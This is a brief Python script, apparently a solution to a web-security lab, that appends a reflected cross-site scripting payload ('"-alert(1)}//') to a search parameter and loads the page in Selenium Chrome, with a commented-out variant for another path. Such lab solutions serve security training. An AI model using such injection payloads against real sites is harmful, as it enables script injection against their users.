import time
import requests
import sys
import webbrowser
from selenium import webdriver

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)


burp_url = sys.argv[1]
xss_1 = burp_url + '/?search=\"-alert(1)}//'
#xss_2 = burp_url + '/search-results?search=\"-alert(1)}//'

driver = webdriver.Chrome()
driver.get(xss_1)
time.sleep(5)
driver.quit()
